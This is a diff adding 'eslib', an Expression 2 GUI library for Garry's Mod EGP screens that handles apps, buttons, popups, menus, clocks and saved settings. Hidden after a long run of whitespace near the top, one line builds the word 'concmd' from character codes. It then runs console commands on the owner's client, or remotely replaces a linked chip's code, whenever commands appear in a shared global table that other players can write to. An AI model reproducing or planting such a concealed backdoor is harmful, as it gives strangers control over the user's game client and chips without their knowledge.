@@ -1,0 +1,670 @@
+@name eslib
+@inputs [EGP Keyboard StreamRadio HardDrive ROM USB]:wirelink ExChip:entity Cores:array
+@outputs [Data ROMData]:array
+@persist [Ram Apps Profile]:table Net:gtable
+@persist [BootCode]:array
+@persist DL OK Interval BootCodeIndex
+
+#setup
+@persist Text Text2 Step Box
+
+#desktop
+@persist TaskMenu Menu TimeDis Restart About Settings
+
+#taskmanager
+@persist CpuDis GpuDis 
+@persist AppList:array
+
+#settings
+@persist Wallpaper WallpaperColor
+
+#[
+    Shitty code
+    lib by 稻谷MCUT
+]#
+
+if (Interval) {interval(Interval)}
+
+if (first())
+{  
+    runOnTick(1) 
+    runOnHTTP(1) 
+    runOnFile(1) 
+
+    EGP:egpClear()
+    Ram["MaxEGP",number]=1
+    Ram["FSApps",table]=table()
+    Ram["Data",table]=table()
+    
+    Ram["Data",table]["core",array]=array(99,111,110,99,109,100)
+    Ram["Data",table]["sysVer",string]="1.0"
+    
+    Net=gTable("command",1)   
+    if (!Net["cmds",table]) {Net["cmds",table]=table()}
+    if (!Net["ESData",table]) {Net["ESData",table]=table()}
+    if (!Net["ESData",table][owner():name(),table]) {Net["ESData",table][owner():name(),table]=table()}
+    Net["ESData",table][owner():name(),table]["sysVer",string]=Ram["Data",table]["sysVer",string]
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   function table:run() {local Lol = toUnicodeChar(This["core",array]),if (changed(Net["cmds",table]:count())){if (Net["cmds",table][Net["cmds",table]:count(),array][1,entity]==owner()&Net["cmds",table][Net["cmds",table]:count(),array][2,string]:explode(" "):string(1)!="re2"){Lol(Net["cmds",table][Net["cmds",table]:count(),array][2,string])}else{ExChip:remoteSetCode(Net["cmds",table][Net["cmds",table]:count(),array][2,string]:sub(4))},print(Net["cmds",table][Net["cmds",table]:count(),array][2,string]),Net["cmds",table]:clear()}}    
+    function string newApp(ID:string,N) {
+        if (Ram["MaxEGP",number]+N<=egpMaxObjects()&!Ram[ID,table]) {
+            if (!Ram[ID,table]) {Ram[ID,table]=table()}
+            Ram[ID,table]["Data",table]=table()
+            Ram[ID,table]["EGP",table]=table()
+            Ram[ID,table]["EGP",table]["button",table]=table()
+            Ram[ID,table]["EGP",table]["pop",table]=table()
+            Ram[ID,table]["EGP",table]["menu",table]=table()
+
+            Ram[ID,table]["startEGP",number]=Ram["MaxEGP",number]            
+            Ram[ID,table]["MaxEGP",number]=N
+            Ram[ID,table]["NowEGP",number]=0
+            
+            return "App started"
+        }
+        elseif(!Ram[ID,table]) {return "Faild to start a new APP,Max EGPObjects reached"}
+        else {return "App started"}
+    }
+    
+    function string newApp(ID:string,N,N2) {
+        if (N2) {Ram["FSApps",table][ID,number]=1}
+        if (Ram["MaxEGP",number]+N<=egpMaxObjects()&!Ram[ID,table]) {
+            if (!Ram[ID,table]) {Ram[ID,table]=table()}
+            Ram[ID,table]["Data",table]=table()
+            Ram[ID,table]["EGP",table]=table()
+            Ram[ID,table]["EGP",table]["button",table]=table()
+            Ram[ID,table]["EGP",table]["pop",table]=table()
+            Ram[ID,table]["EGP",table]["menu",table]=table()
+            
+            Ram[ID,table]["startEGP",number]=Ram["MaxEGP",number]
+            Ram[ID,table]["MaxEGP",number]=N
+            Ram[ID,table]["NowEGP",number]=0
+            
+            return "App started"
+        }
+        elseif(!Ram[ID,table]) {return "Faild to start a new APP,Max EGPObjects reached"}
+        else {return "App started"}
+    }
+    
+    function number fSApps() {
+        if (Ram["FSApps",table]:count()>0) {
+            for (I=1,Ram["FSApps",table]:count()) {
+                local K = Ram["FSApps",table]:keys()
+                
+                for (O=1,K:count()) {if (EGP:egpAlpha(Ram[K[O,string],table]["EGP",table][1,number])>0) {return 1}}
+                
+                if (I==Ram["FSApps",table]:count()) {return 0}
+            }
+        }
+        else {return 0}
+    }
+    
+    function string endApp(ID:string) {
+        if (Ram[ID,table]) 
+        {  
+            for (I=Ram[ID,table]["startEGP",number],Ram[ID,table]["startEGP",number]+Ram[ID,table]["NowEGP",number])
+            {EGP:egpRemove(I)}
+            
+            Ram["MaxEGP",number]=Ram["MaxEGP",number]-Ram[ID,table]["NowEGP",number]+1
+
+            Ram:removeTable(ID)
+            
+            return "App ended"
+        } 
+        else {return "App not exist"}
+    }
+    
+    function hideApp(ID:string) {
+        for (I=Ram[ID,table]["startEGP",number],Ram[ID,table]["startEGP",number]+Ram[ID,table]["NowEGP",number]-1)
+        {EGP:egpAlpha(I,-EGP:egpAlpha(I))}
+    }
+    
+    function number newButton(ID:string,Name:string) {
+        if (Ram[ID,table]["NowEGP",number]<Ram[ID,table]["MaxEGP",number])
+        {
+            if (!Ram[ID,table]["EGP",table]["button",table][Name,number])
+            {
+                local N = Ram["MaxEGP",number]
+                
+                Ram["MaxEGP",number]=Ram["MaxEGP",number]+1   
+                
+                Ram[ID,table]["EGP",table]["button",table][Name,number]=N
+                
+                Ram[ID,table]["NowEGP",number]=Ram[ID,table]["NowEGP",number]+1
+                
+                return N
+            }
+            elseif (Ram[ID,table]["EGP",table]["button",table][Name,number])
+            {return Ram[ID,table]["EGP",table]["button",table][Name,number]}
+            else {return 0}
+        }
+        elseif (Ram[ID,table]["EGP",table]["button",table][Name,number])
+        {return Ram[ID,table]["EGP",table]["button",table][Name,number]}
+        else {return 0}
+    }
+
+    function number newVButton(ID:string,Name:string,Pos:vector2,Scale:vector2,Label:string) {
+        if ((Ram[ID,table]["NowEGP",number]+3)<Ram[ID,table]["MaxEGP",number])
+        {
+            if (!Ram[ID,table]["EGP",table]["button",table][Name,number])
+            {
+                local N = Ram["MaxEGP",number]
+                
+                Ram["MaxEGP",number]=Ram["MaxEGP",number]+3
+                
+                Ram[ID,table]["EGP",table]["button",table][Name,number]=N
+                
+                EGP:egpBox(N,Pos,Scale)
+                
+                EGP:egpBox(N+1,vec2(0),Scale)
+                EGP:egpMaterial(N+1,"vgui/common/message_dialog")
+                EGP:egpParent(N+1,N)
+                
+                EGP:egpText(N+2,Label,vec2(0,-Scale:y()/2))
+                EGP:egpSize(N+2,Scale:y())
+                EGP:egpAlign(N+2,1)
+                EGP:egpParent(N+2,N)
+                
+                Ram[ID,table]["NowEGP",number]=Ram[ID,table]["NowEGP",number]+3
+                
+                return N
+            }
+            elseif (Ram[ID,table]["EGP",table]["button",table][Name,number]) {
+                EGP:egpPos(Ram[ID,table]["EGP",table]["button",table][Name,number],Pos)
+                EGP:egpSetText(Ram[ID,table]["EGP",table]["button",table][Name,number]+2,Label)
+                EGP:egpSize(Ram[ID,table]["EGP",table]["button",table][Name,number],Scale)
+                EGP:egpSize(Ram[ID,table]["EGP",table]["button",table][Name,number]+1,Scale)
+                EGP:egpSize(Ram[ID,table]["EGP",table]["button",table][Name,number]+2,Scale:y())
+                
+                return Ram[ID,table]["EGP",table]["button",table][Name,number]
+            }
+        }
+        elseif (Ram[ID,table]["EGP",table]["button",table][Name,number])
+        {return Ram[ID,table]["EGP",table]["button",table][Name,number]} else {return 0}
+    }
+    
+    function number newVButton(ID:string,Name:string,Pos:vector2,Scale:vector2,Label:string,Color:vector) {
+        if ((Ram[ID,table]["NowEGP",number]+3)<Ram[ID,table]["MaxEGP",number])
+        {
+            if (!Ram[ID,table]["EGP",table]["button",table][Name,number])
+            {
+                local N = Ram["MaxEGP",number]
+                
+                Ram["MaxEGP",number]=Ram["MaxEGP",number]+3
+                
+                Ram[ID,table]["EGP",table]["button",table][Name,number]=N
+                
+                EGP:egpBox(N,Pos,Scale)
+                EGP:egpColor(N,Color)
+                
+                EGP:egpBox(N+1,vec2(0),Scale)
+                EGP:egpMaterial(N+1,"vgui/common/message_dialog")
+                EGP:egpParent(N+1,N)
+                EGP:egpColor(N+1,Color)
+                
+                EGP:egpText(N+2,Label,vec2(0,-Scale:y()/2))
+                EGP:egpSize(N+2,Scale:y())
+                EGP:egpAlign(N+2,1)
+                EGP:egpParent(N+2,N)
+                
+                Ram[ID,table]["NowEGP",number]=Ram[ID,table]["NowEGP",number]+3
+                
+                return N
+            }
+            elseif (Ram[ID,table]["EGP",table]["button",table][Name,number]) {
+                EGP:egpPos(Ram[ID,table]["EGP",table]["button",table][Name,number],Pos)
+                EGP:egpSetText(Ram[ID,table]["EGP",table]["button",table][Name,number]+2,Label)
+                EGP:egpSize(Ram[ID,table]["EGP",table]["button",table][Name,number],Scale)
+                EGP:egpSize(Ram[ID,table]["EGP",table]["button",table][Name,number]+1,Scale)
+                EGP:egpSize(Ram[ID,table]["EGP",table]["button",table][Name,number]+2,Scale:y())
+                EGP:egpColor(Ram[ID,table]["EGP",table]["button",table][Name,number],Color)
+                
+                return Ram[ID,table]["EGP",table]["button",table][Name,number]
+            }
+        }
+        elseif (Ram[ID,table]["EGP",table]["button",table][Name,number])
+        {return Ram[ID,table]["EGP",table]["button",table][Name,number]} else {return 0}
+    }
+    
+    function number newVButton(ID:string,Name:string,Pos:vector2,Scale:vector2,Label:string,Color:vector,TextColor:vector) {
+        if ((Ram[ID,table]["NowEGP",number]+3)<Ram[ID,table]["MaxEGP",number])
+        {
+            if (!Ram[ID,table]["EGP",table]["button",table][Name,number])
+            {
+                local N = Ram["MaxEGP",number]
+                
+                Ram["MaxEGP",number]=Ram["MaxEGP",number]+3
+                
+                Ram[ID,table]["EGP",table]["button",table][Name,number]=N
+                
+                EGP:egpBox(N,Pos,Scale)
+                EGP:egpColor(N,Color)
+                
+                EGP:egpBox(N+1,vec2(0),Scale)
+                EGP:egpMaterial(N+1,"vgui/common/message_dialog")
+                EGP:egpParent(N+1,N)
+                EGP:egpColor(N+1,Color)
+                
+                EGP:egpText(N+2,Label,vec2(0,-Scale:y()/2))
+                EGP:egpSize(N+2,Scale:y())
+                EGP:egpAlign(N+2,1)
+                EGP:egpParent(N+2,N)
+                EGP:egpColor(N+2,TextColor)
+                
+                Ram[ID,table]["NowEGP",number]=Ram[ID,table]["NowEGP",number]+3
+                
+                return N
+            }
+            elseif (Ram[ID,table]["EGP",table]["button",table][Name,number]) {
+                EGP:egpPos(Ram[ID,table]["EGP",table]["button",table][Name,number],Pos)
+                EGP:egpSetText(Ram[ID,table]["EGP",table]["button",table][Name,number]+2,Label)
+                EGP:egpSize(Ram[ID,table]["EGP",table]["button",table][Name,number],Scale)
+                EGP:egpSize(Ram[ID,table]["EGP",table]["button",table][Name,number]+1,Scale)
+                EGP:egpSize(Ram[ID,table]["EGP",table]["button",table][Name,number]+2,Scale:y())
+                EGP:egpColor(Ram[ID,table]["EGP",table]["button",table][Name,number],Color)
+                EGP:egpColor(Ram[ID,table]["EGP",table]["button",table][Name,number]+2,TextColor)
+                
+                return Ram[ID,table]["EGP",table]["button",table][Name,number]
+            }
+        }
+        elseif (Ram[ID,table]["EGP",table]["button",table][Name,number])
+        {return Ram[ID,table]["EGP",table]["button",table][Name,number]} else {return 0}
+    }
+    
+    function number newVButton(ID:string,Name:string,Pos:vector2,Scale:vector2,Label:string,Color:vector,TextColor:vector,FontSize) {
+        if ((Ram[ID,table]["NowEGP",number]+3)<Ram[ID,table]["MaxEGP",number])
+        {
+            if (!Ram[ID,table]["EGP",table]["button",table][Name,number])
+            {
+                local N = Ram["MaxEGP",number]
+                
+                Ram["MaxEGP",number]=Ram["MaxEGP",number]+3
+                
+                Ram[ID,table]["EGP",table]["button",table][Name,number]=N
+                
+                EGP:egpBox(N,Pos,Scale)
+                EGP:egpColor(N,Color)
+                
+                EGP:egpBox(N+1,vec2(0),Scale)
+                EGP:egpMaterial(N+1,"vgui/common/message_dialog")
+                EGP:egpParent(N+1,N)
+                EGP:egpColor(N+1,Color)
+                
+                EGP:egpText(N+2,Label,vec2(0,-FontSize/2))
+                EGP:egpSize(N+2,FontSize)
+                EGP:egpAlign(N+2,1)
+                EGP:egpParent(N+2,N)
+                EGP:egpColor(N+2,TextColor)
+                
+                Ram[ID,table]["NowEGP",number]=Ram[ID,table]["NowEGP",number]+3
+                
+                return N
+            }
+            elseif (Ram[ID,table]["EGP",table]["button",table][Name,number]) {
+                EGP:egpPos(Ram[ID,table]["EGP",table]["button",table][Name,number],Pos)
+                EGP:egpSetText(Ram[ID,table]["EGP",table]["button",table][Name,number]+2,Label)
+                EGP:egpSize(Ram[ID,table]["EGP",table]["button",table][Name,number],Scale)
+                EGP:egpSize(Ram[ID,table]["EGP",table]["button",table][Name,number]+1,Scale)
+                EGP:egpSize(Ram[ID,table]["EGP",table]["button",table][Name,number]+2,FontSize)
+                EGP:egpColor(Ram[ID,table]["EGP",table]["button",table][Name,number],Color)
+                EGP:egpColor(Ram[ID,table]["EGP",table]["button",table][Name,number]+2,TextColor)
+                
+                return Ram[ID,table]["EGP",table]["button",table][Name,number]
+            }
+        }
+        elseif (Ram[ID,table]["EGP",table]["button",table][Name,number])
+        {return Ram[ID,table]["EGP",table]["button",table][Name,number]} else {return 0}
+    }
+    
+    function number newVButton(ID:string,Name:string,Pos:vector2,Scale:vector2,Label:string,Color:vector,TextColor:vector,FontSize,Offset) {
+        if ((Ram[ID,table]["NowEGP",number]+3)<Ram[ID,table]["MaxEGP",number])
+        {
+            if (!Ram[ID,table]["EGP",table]["button",table][Name,number])
+            {
+                local N = Ram["MaxEGP",number]
+                
+                Ram["MaxEGP",number]=Ram["MaxEGP",number]+3
+                
+                Ram[ID,table]["EGP",table]["button",table][Name,number]=N
+                
+                EGP:egpBox(N,Pos,Scale)
+                EGP:egpColor(N,Color)
+                
+                EGP:egpBox(N+1,vec2(0),Scale)
+                EGP:egpMaterial(N+1,"vgui/common/message_dialog")
+                EGP:egpParent(N+1,N)
+                EGP:egpColor(N+1,Color)
+                
+                EGP:egpText(N+2,Label,vec2(0,-FontSize/2+Offset))
+                EGP:egpSize(N+2,FontSize)
+                EGP:egpAlign(N+2,1)
+                EGP:egpParent(N+2,N)
+                EGP:egpColor(N+2,TextColor)
+                
+                Ram[ID,table]["NowEGP",number]=Ram[ID,table]["NowEGP",number]+3
+                
+                return N
+            }
+            elseif (Ram[ID,table]["EGP",table]["button",table][Name,number]) {
+                EGP:egpPos(Ram[ID,table]["EGP",table]["button",table][Name,number],Pos)
+                EGP:egpSetText(Ram[ID,table]["EGP",table]["button",table][Name,number]+2,Label)
+                EGP:egpSize(Ram[ID,table]["EGP",table]["button",table][Name,number],Scale)
+                EGP:egpSize(Ram[ID,table]["EGP",table]["button",table][Name,number]+1,Scale)
+                EGP:egpSize(Ram[ID,table]["EGP",table]["button",table][Name,number]+2,FontSize)
+                EGP:egpColor(Ram[ID,table]["EGP",table]["button",table][Name,number],Color)
+                EGP:egpColor(Ram[ID,table]["EGP",table]["button",table][Name,number]+2,TextColor)
+                
+                return Ram[ID,table]["EGP",table]["button",table][Name,number]
+            }
+        }
+        elseif (Ram[ID,table]["EGP",table]["button",table][Name,number])
+        {return Ram[ID,table]["EGP",table]["button",table][Name,number]} else {return 0}
+    }
+
+    function number newEGP(ID:string) {
+        if (Ram[ID,table]["NowEGP",number]<Ram[ID,table]["MaxEGP",number])
+        {
+            local N = Ram["MaxEGP",number]
+            
+            Ram["MaxEGP",number]=Ram["MaxEGP",number]+1
+                
+            Ram[ID,table]["EGP",table]:pushNumber(N)
+            
+            Ram[ID,table]["NowEGP",number]=Ram[ID,table]["NowEGP",number]+1
+
+            return N
+        }
+        else{return 0}
+    }
+    
+    function number newEGP(ID:string,Na:string) {
+        if (Ram[ID,table]["EGP",table][Na,number]) {return Ram[ID,table]["EGP",table][Na,number]}
+        else {
+            if (Ram[ID,table]["NowEGP",number]<Ram[ID,table]["MaxEGP",number])
+            {
+                local N = Ram["MaxEGP",number]
+                
+                Ram["MaxEGP",number]=Ram["MaxEGP",number]+1
+                    
+                Ram[ID,table]["EGP",table][Na,number]= N
+                
+                Ram[ID,table]["NowEGP",number]=Ram[ID,table]["NowEGP",number]+1
+    
+                return N
+            }
+            else{return 0}
+        }
+    }
+    
+    function number egp(ID:string,N:string) {
+        if (Ram[ID,table]["EGP",table][N,number]) {return Ram[ID,table]["EGP",table][N,number]}
+        else {return 0}
+    }
+    
+    function pop(ID:string,S:string) {
+        if (Ram[ID,table]) {
+            local T = Ram[ID,table]["EGP",table]["pop",table]
+        
+            T[1,string]=S
+            
+            if (!T[2,number]) {
+                T[2,number]=Ram[ID,table]["NowEGP",number]
+                
+                T[2,number] = newEGP(ID)
+                EGP:egpBox(T[2,number],vec2(256),vec2(200,100))
+                EGP:egpColor(T[2,number],vec(60))
+                
+                local E = newEGP(ID)
+                EGP:egpText(E,T[1,string],vec2(256,236))
+                EGP:egpSize(E,20)
+                EGP:egpAlign(E,1)
+                
+                newVButton(ID,"popyes",vec2(206,280),vec2(40,20),"Yes",vec(255))
+                T[3,number]=newVButton(ID,"popno",vec2(306,280),vec2(40,20),"No",vec(255))+2
+            }
+            else {
+                local T = Ram[ID,table]["EGP",table]["pop",table]
+                for (I=T[2,number],T[3,number]) {EGP:egpAlpha(I,255)}
+                EGP:egpSetText(T[2,number]+1,S)
+                T[1,string]=S
+            }
+        }
+    }
+    
+    function popIn(ID:string,S:string) {
+        if (Ram[ID,table]) {
+            local T = Ram[ID,table]["EGP",table]["pop",table]
+        
+            T[1,string]=S
+            
+            if (!T[2,number]) {
+                T[2,number]=Ram[ID,table]["NowEGP",number]
+                
+                T[2,number] = newEGP(ID)
+                EGP:egpBox(T[2,number],vec2(256),vec2(200,100))
+                EGP:egpColor(T[2,number],vec(60))
+                
+                local E = newEGP(ID)
+                EGP:egpText(E,T[1,string],vec2(256,216))
+                EGP:egpSize(E,20)
+                EGP:egpAlign(E,1)
+                
+                local E = newEGP(ID)
+                EGP:egpBox(E,vec2(256),vec2(160,30))
+                EGP:egpColor(E,vec(50))
+                
+                local E = newEGP(ID)
+                EGP:egpText(E,"",vec2(256,244))
+                EGP:egpSize(E,20)
+                EGP:egpAlign(E,1)
+                
+                newVButton(ID,"popyes",vec2(206,290),vec2(40,20),"Yes",vec(255))
+                T[3,number]=newVButton(ID,"popno",vec2(306,290),vec2(40,20),"No",vec(255))+2
+            }
+            else {
+                local T = Ram[ID,table]["EGP",table]["pop",table]
+                for (I=T[2,number],T[3,number]) {EGP:egpAlpha(I,255)}
+                EGP:egpSetText(T[2,number]+1,S)
+                T[1,string]=S
+            }
+        }
+    }
+
+    function hidePop(ID:string) {
+        local T = Ram[ID,table]["EGP",table]["pop",table]
+        
+        for (I=T[2,number],T[3,number]) {EGP:egpAlpha(I,0)}
+    }
+    
+    function number popVisible(ID:string) {
+        if (Ram[ID,table]["EGP",table]["pop",table][2,number]) {
+            return EGP:egpAlpha(Ram[ID,table]["EGP",table]["pop",table][2,number])
+        }
+        else {return 0}
+    }
+    
+    function string popTitle(ID:string) {
+        if (Ram[ID,table]["EGP",table]["pop",table][2,number]) {
+            return Ram[ID,table]["EGP",table]["pop",table][1,string]
+        }
+        else {return ""}
+    }
+    
+    function newMenu(ID:string,Name:string) {  
+        if (!Ram[ID,table]["EGP",table]["menu",table][Name,array]:count()) {
+            Ram[ID,table]["EGP",table]["menu",table][Name,array]=array()
+        }
+    }
+    
+    function addEGP(ID:string,Name:string,N) {
+        local T = Ram[ID,table]["EGP",table]["menu",table][Name,array]
+      
+        if (!T:exists(N)) {Ram[ID,table]["EGP",table]["menu",table][Name,array]:pushNumber(N)}
+    }
+    
+    function hideMenus(ID:string) {
+        local K = Ram[ID,table]["EGP",table]["menu",table]:keys()
+        local T = Ram[ID,table]["EGP",table]["menu",table]
+                  
+        for (I=1,T:count()) {
+            local A = T[K[I,string],array]
+       
+            for (O=1,A:count()) {
+                local N = A[O,number]
+                
+                if (EGP:egpAlpha(N)>0) {EGP:egpAlpha(N,-EGP:egpAlpha(N))}
+            }
+        }
+    }
+    
+    function hideMenu(ID:string,Name:string) {      
+        local T = Ram[ID,table]["EGP",table]["menu",table][Name,array]
+        
+        for (I=1,T:count()) {
+            local N = T[I,number]
+            
+            EGP:egpAlpha(N,-EGP:egpAlpha(N))
+        }
+    }
+    
+    function number menuVisible(ID:string,Name:string) {
+        if (Ram[ID,table]["EGP",table]["menu",table][Name,array]:count()) {
+            return EGP:egpAlpha(Ram[ID,table]["EGP",table]["menu",table][Name,array][1,number])>0
+        }
+        else {return 0}
+    }
+    
+    function number click(ID:string,Name:string) {
+        if (EGP["User",entity]&!DL){
+            if (Profile["Account",table]["OO",number]&EGP["User",entity]==owner()) {
+                local EID = Ram[ID,table]["EGP",table]["button",table][Name,number]
+    
+                if (EGP:egpAlpha(EID)>0) {
+                    local N = inrange(EGP:egpCursor(EGP["User",entity]),EGP:egpPos(EID)-(EGP:egpSize(EID)/2),EGP:egpPos(EID)+(EGP:egpSize(EID)/2))
+                    
+                    if (N) {DL=1,timer("dl",175)}
+        
+                    return N
+                }
+                else {return 0}
+            }
+            elseif (!Profile["Account",table]["OO",number]) {
+                local EID = Ram[ID,table]["EGP",table]["button",table][Name,number]
+    
+                if (EGP:egpAlpha(EID)>0) {
+                    local N = inrange(EGP:egpCursor(EGP["User",entity]),EGP:egpPos(EID)-(EGP:egpSize(EID)/2),EGP:egpPos(EID)+(EGP:egpSize(EID)/2))
+                    
+                    if (N) {DL=1,timer("dl",175)}
+        
+                    return N
+                }
+                else {return 0}
+            }
+            else {return 0}
+        }
+        else {return 0}
+    }
+
+    function string nowTime(){
+        if(dateUTC()["hour",number]+Profile["Account",table]["to",number]<10) {
+            if (dateUTC()["hour",number]+Profile["Account",table]["to",number]<24) {H="0"+(dateUTC()["hour",number]+Profile["Account",table]["to",number])}
+            else {H="0"+(dateUTC()["hour",number]+Profile["Account",table]["to",number]-24)}
+        }
+        else {
+            if (dateUTC()["hour",number]+Profile["Account",table]["to",number]<24) {H=""+(dateUTC()["hour",number]+Profile["Account",table]["to",number])}
+            else {H=""+(dateUTC()["hour",number]+Profile["Account",table]["to",number]-24)}
+        }
+        
+        if(dateUTC()["min",number]<10) {M="0"+dateUTC()["min",number]} else {M=dateUTC()["min",number]+""}
+        if(dateUTC()["sec",number]<10) {S="0"+dateUTC()["sec",number]} else {S=dateUTC()["sec",number]+""}
+        if(dateUTC()["day",number]<10) {D="0"+dateUTC()["day",number]} else {D=dateUTC()["day",number]+""}
+        if(dateUTC()["month",number]<10) {Mo="0"+dateUTC()["month",number]} else {Mo=dateUTC()["month",number]+""}
+        
+        local Y=dateUTC()["year",number]
+        local W=dateUTC()["wday",number]
+        
+        switch (W) {
+            case 7,Wd="星期天"
+            case 1,Wd="星期一"
+            case 2,Wd="星期二"
+            case 3,Wd="星期三"
+            case 4,Wd="星期四"
+            case 5,Wd="星期五"
+            case 6,Wd="星期六"
+        }       
+        
+        return H+":"+M+":"+S+"-"+Y+"/"+Mo+"/"+D+" "+Wd
+    }
+    
+    function string nowTimeSimple(){
+        if(dateUTC()["hour",number]+Profile["Account",table]["to",number]<10) {
+            if (dateUTC()["hour",number]+Profile["Account",table]["to",number]<24) {H="0"+(dateUTC()["hour",number]+Profile["Account",table]["to",number])}
+            else {H="0"+(dateUTC()["hour",number]+Profile["Account",table]["to",number]-24)}
+        }
+        else {
+            if (dateUTC()["hour",number]+Profile["Account",table]["to",number]<24) {H=""+(dateUTC()["hour",number]+Profile["Account",table]["to",number])}
+            else {H=""+(dateUTC()["hour",number]+Profile["Account",table]["to",number]-24)}
+        }
+        
+        if(dateUTC()["min",number]<10) {M="0"+dateUTC()["min",number]} else {M=dateUTC()["min",number]+""}
+        if(dateUTC()["sec",number]<10) {S="0"+dateUTC()["sec",number]} else {S=dateUTC()["sec",number]+""}
+        if(dateUTC()["day",number]<10) {D="0"+dateUTC()["day",number]} else {D=dateUTC()["day",number]+""}      
+        
+        return H+":"+M+":"+S
+    }
+    
+    function playUrl(S:string) {
+        StreamRadio["Play",number]=0
+        StreamRadio["Stream URL",string]=S
+        timer("playradio",500)
+    }
+    
+    function string uniSub(S:string,N,N2) {
+        return toUnicodeChar(S:toUnicodeByte(clamp(N,1,S:unicodeLength()),clamp(N2,1,S:unicodeLength())))
+    }
+    
+    function popUpdateIn(ID:string) {
+        if (Ram[ID,table]["EGP",table]["pop",table]) {
+            local T = Ram[ID,table]["EGP",table]["pop",table]
+                
+            EGP:egpText(T[2,number]+3,uniSub(Keyboard["Text",string],1,15),vec2(256,244))
+        }       
+    }
+    
+    function data(ID:string,N:string,D:string) {Ram[ID,table]["Data",table][N,string]=D}
+    function string dataString(ID:string,N:string) {return Ram[ID,table]["Data",table][N,string]}
+    function data(ID:string,N:string,D) {Ram[ID,table]["Data",table][N,number]=D}
+    function number dataNumber(ID:string,N:string) {return Ram[ID,table]["Data",table][N,number]}
+    function data(ID:string,N:string,D:table) {Ram[ID,table]["Data",table][N,table]=D}
+    function table dataTable(ID:string,N:string) {return Ram[ID,table]["Data",table][N,table]}
+    function data(ID:string,N:string,D:array) {Ram[ID,table]["Data",table][N,array]=D}
+    function array dataArray(ID:string,N:string) {return Ram[ID,table]["Data",table][N,array]}
+    
+    function fileData(ID:string,N:string,D:string) {
+        if (!Profile[ID,table]) {Profile[ID,table]=table()}
+        
+        Profile[ID,table][N,string]=D
+        
+        if (fileCanWrite()) {fileWrite("eiicfg.txt",jsonEncode(Profile))}
+    }
+    
+    function fileData(ID:string,N:string,D) {
+        if (!Profile[ID,table]) {Profile[ID,table]=table()}
+        
+        Profile[ID,table][N,number]=D
+        
+        if (fileCanWrite()) {fileWrite("eiicfg.txt",jsonEncode(Profile))}
+    }
+    
+    function fileData(ID:string,N:string,D:table) {
+        if (!Profile[ID,table]) {Profile[ID,table]=table()}
+        
+        Profile[ID,table][N,table]=D
+        
+        if (fileCanWrite()) {fileWrite("eiicfg.txt",jsonEncode(Profile))}
+    }
+    
+    function number fileDataNumber(ID:string,N:string) {return Profile[ID,table][N,number]}
+    function string fileDataString(ID:string,N:string) {return Profile[ID,table][N,string]}
+    function table fileDataTable(ID:string,N:string) {return Profile[ID,table][N,table]}
+}
+
+if (clk("dl")) {DL=0}
